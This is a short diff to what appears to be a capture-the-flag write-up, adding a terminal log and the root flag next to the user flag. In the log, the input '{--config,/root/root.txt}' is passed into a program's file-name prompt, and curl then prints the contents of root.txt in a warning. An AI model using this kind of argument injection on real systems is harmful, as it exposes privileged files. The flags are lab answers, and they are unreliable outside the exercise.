@@ -384,10 +384,20 @@ Unsupported opcode: <255>
 # WARNING: Decompyle incomplete
 ````
 
+````
+Enter your choice:3
+Enter the IP/file_name:{--config,/root/root.txt}
+Warning: /root/root.txt:1: warning: '80a976f167daaf0abfc468bb5135bc5a' is 
+Warning: unknown
+curl: no URL specified!
+curl: try 'curl --help' or 'curl --manual' for more information
+Enter your choice:
+````
+
 # Secrets
 
 * FLAG_USER = 5ecb2ce89e7a1d0f01010095b0e6c99e
-* 
+* FLAG_ROOT = 80a976f167daaf0abfc468bb5135bc5a
 
 https://docs.authlib.org/en/latest/jose/index.html
 https://www.compart.com/en/unicode/U+FE30
